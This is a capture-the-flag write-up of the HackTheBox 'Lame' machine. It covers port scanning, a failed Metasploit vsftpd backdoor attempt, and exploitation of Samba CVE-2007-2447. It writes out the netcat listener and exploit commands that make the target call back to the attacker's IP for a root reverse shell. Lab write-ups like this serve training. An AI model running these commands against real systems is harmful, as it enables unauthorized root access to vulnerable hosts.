
## Overview
Writeup for HackTheBox VM [Lame](https://www.hackthebox.eu/home/machines/profile/1).

**Categories**: oscp, htb, linux
**Tags**: exploit_smb_usermap

### Killchain
`enumeration` → `exploitation` → `privilege escalation`

### TTPs
1. `139/tcp/netbios-ssn/Samba smbd 3.X - 4.X (workgroup: WORKGROUP)`: exploit_smb_usermap

---

## Phase #1: Enumeration

1. Nmap scan result:

```
# nmap -vv --reason -Pn -sV -sC --version-all 10.10.10.3
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Workgroup: WORKGROUP
```

2. Summary of open ports produced via [AutoRecon](https://github.com/Tib3rius/AutoRecon).

3. The `vsftpd` service allows anonymous logins; connecting reveals nothing interesting. There is a known MSF exploit for `vsftpd 2.3.4`, but it **failed** to obtain a session here:

```
ftp 10.10.10.3
msfconsole
  use exploit/unix/ftp/vsftpd_234_backdoor
  set RHOST 10.10.10.3
  show options
  exploit
```

4. The open (read+write) SMB share `tmp` is explored, but with no service (e.g. HTTP) to leverage uploaded files, move on:

```
smbclient \\\\10.10.10.3\\tmp
  dir
```

### Findings — Open Ports
```
21/tcp   |  ftp          |  vsftpd 2.3.4
22/tcp   |  ssh          |  OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  |  netbios-ssn  |  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  |  netbios-ssn  |  Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

---

## Phase #2: Exploitation

1. SMB version `3.0.20-Debian` maps to the well-known `usermap_script` vulnerability (CVE-2007-2447). A public [Python PoC](https://github.com/amriunix/CVE-2007-2447) exists. Following the exploit instructions yields a shell with elevated privileges:

```
nc -nlvp 443
python usermap_script.py 10.10.10.3 139 10.10.14.18 443
```

2. Read both flags to complete the challenge:

```
cat /home/makis/user.txt
cat /root/root.txt
```

---

## Phase #2.5: Post Exploitation

```
root@lame> id
uid=0(root) gid=0(root)
root@lame> uname
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
root@lame> users
root
makis
```

---

## References
- <https://www.hackthebox.eu/home/machines/profile/1>
- <https://hackingresources.com/lame-hackthebox-walkthrough/>
- Original writeup: <https://github.com/7h3rAm/writeups/blob/master/htb.lame/writeup.md>
